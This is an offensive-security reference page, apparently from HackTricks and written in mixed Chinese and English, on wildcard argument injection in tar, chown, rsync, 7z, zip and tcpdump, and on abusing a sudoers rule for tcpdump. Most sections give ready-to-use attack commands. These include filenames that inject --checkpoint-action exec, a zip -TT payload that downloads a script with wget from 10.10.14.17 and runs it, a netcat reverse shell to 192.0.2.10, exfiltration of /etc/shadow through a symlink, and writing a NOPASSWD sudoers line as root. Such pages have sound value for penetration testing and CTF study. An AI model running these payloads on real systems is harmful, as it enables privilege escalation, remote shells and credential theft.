# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** 发生在特权脚本以未加引号的通配符（例如 `*`）运行 Unix 二进制（如 `tar`, `chown`, `rsync`, `zip`, `7z`, …）时。
> 由于 shell 在执行二进制之前展开通配符，攻击者如果能在当前工作目录创建文件，就可以构造以 `-` 开头的文件名，使其被解释为**选项而非数据**，从而实质上走私任意标志甚至命令。
> 本页收集了对 2023-2025 年最有用的原语、近期研究和现代检测方法。

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
当 root 稍后执行类似下面的操作时：
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` 被注入，导致 *all* 匹配的文件继承 `/root/secret``file` 的所有权/权限。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn)（组合攻击）。
另请参阅经典的 DefenseCode 论文以获取详细信息。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

通过滥用 **checkpoint** 功能来执行任意命令：
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
一旦 root 运行例如 `tar -czf /root/backup.tgz *`，`shell.sh` 就会以 root 身份执行。

### bsdtar / macOS 14+

近期 macOS 上默认的 `tar`（基于 `libarchive`）*不*实现 `--checkpoint`，但你仍然可以通过 **--use-compress-program** 标志来实现代码执行，该标志允许你指定外部压缩程序。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
当一个以特权运行的脚本执行 `tar -cf backup.tar *` 时，会启动 `/bin/sh`。

---

## rsync

`rsync` 允许你通过以 `-e` 或 `--rsync-path` 开头的命令行参数覆盖远程 shell，甚至远程二进制文件：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
如果 root 后来使用 `rsync -az * backup:/srv/` 将该目录归档，注入的 flag 会在远程端为你启动一个 shell。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

即使具有特权的脚本*出于防御性地*在通配符前加上 `--`（以停止选项解析），7-Zip 格式也通过在文件名之前加 `@` 支持**文件列表文件**。将其与符号链接结合可以让你*外传任意文件*：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
如果 root 执行类似下面的命令：
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip 会尝试将 `root.txt`（→ `/etc/shadow`）作为文件列表读取并退出，**将内容打印到 stderr**。

---

## zip

当应用将用户控制的文件名传递给 `zip`（要么通过通配符，要么在列举名称时不使用 `--`）时，存在两种非常实用的原语。

- RCE via test hook: `-T` 启用 “test archive” 而 `-TT <cmd>` 用任意程序替换测试器（长格式：`--unzip-command <cmd>`）。如果你能注入以 `-` 开头的文件名，拆分标志到不同的文件名，以便短选项解析正常工作：
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
注意事项
- 不要尝试像 `'-T -TT <cmd>'` 这样的单个文件名 — 短选项会按字符解析，会导致失败。请使用独立的参数，如下所示。
- 如果应用从文件名中去掉了斜杠，请从裸主机/IP 获取（默认路径 `/index.html`），用 `-O` 保存到本地，然后执行。
- 可以使用 `-sc`（显示处理后的 argv）或 `-h2`（更多帮助）来调试解析，了解你的参数如何被处理。

示例（zip 3.0 的本地行为）：
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: 如果 web 层回显 `zip` stdout/stderr（在天真的 wrapper 中很常见），注入的 flags（例如 `--help`）或由错误选项导致的失败会出现在 HTTP response 中，从而确认命令行注入并有助于调整 payload。

---

## 其他易受 wildcard injection 影响的二进制（2023-2025 快速列表）

以下命令在现代 CTFs 和真实环境中被滥用。payload 通常作为可写目录中的一个 *filename* 创建，随后会被带通配符的程序处理：

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | 读取文件内容 |
| `flock` | `-c <cmd>` | 执行命令 |
| `git`   | `-c core.sshCommand=<cmd>` | 通过 git over SSH 执行命令 |
| `scp`   | `-S <cmd>` | 启动任意程序以替代 ssh |

这些原语不如 *tar/rsync/zip* 经典工具常见，但在搜索时值得检查。

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

当受限 shell 或 vendor wrapper 通过拼接用户可控字段（例如 "file name" 参数）构建 `tcpdump` 命令行，但未对这些字段进行严格的引号处理/校验时，你可以夹带额外的 `tcpdump` flags。`-G`（time-based rotation）、`-W`（limit number of files）与 `-z <cmd>`（post-rotate command） 的组合会以运行 tcpdump 的用户身份（在设备上通常为 root）执行任意命令。

Preconditions:

- 你能够影响传递给 `tcpdump` 的 `argv`（例如通过类似 `/debug/tcpdump --filter=... --file-name=<HERE>` 的 wrapper）。
- The wrapper does not sanitize spaces or `-`-prefixed tokens in the file name field.

Classic PoC (executes a reverse shell script from a writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` 强制在第一个匹配的数据包后立即轮换。
- `-z <cmd>` 在每次轮换时运行一次轮换后命令。许多构建会执行 `<cmd> <savefile>`。如果 `<cmd>` 是脚本/解释器，确保参数处理与您的 payload 匹配。

No-removable-media variants:

- 如果你有任何其他用于写文件的原语（例如，允许输出重定向的单独命令封装），把你的脚本放到一个已知路径并触发 `-z /bin/sh /path/script.sh` 或 `-z /path/script.sh`，取决于平台语义。
- 一些厂商的 wrapper 会将轮换目标写到攻击者可控的位置。如果你能影响被轮换的路径（符号链接/目录遍历），你可以引导 `-z` 去执行你完全控制的内容，而无需外部媒体。

---

## sudoers: tcpdump with wildcards/additional args → 任意写/读 和 root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
问题
- `*` 通配符和宽松模式只约束第一个 `-w` 参数。`tcpdump` 接受多个 `-w` 选项；最后一个生效。
- 规则没有固定其他选项，所以 `-Z`、`-r`、-`V` 等是被允许的。

原语
- 使用第二个 `-w` 覆盖目标路径（第一个仅用于满足 sudoers）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 在第一个 `-w` 中进行路径遍历以逃离受限树：
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 强制输出所有权为 `-Z root`（在任何位置创建 root 所有的文件）:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 通过使用 `-r` 重放特制的 PCAP 来写入任意内容（例如，写入一行 sudoers）：

<details>
<summary>创建一个包含精确 ASCII 有效负载的 PCAP 并以 root 身份写入</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- 使用 `-V <file>` 可进行任意文件读取/秘密 leak（将其解释为 savefiles 列表）。错误诊断通常会回显行，导致内容 leak：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 参考资料

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
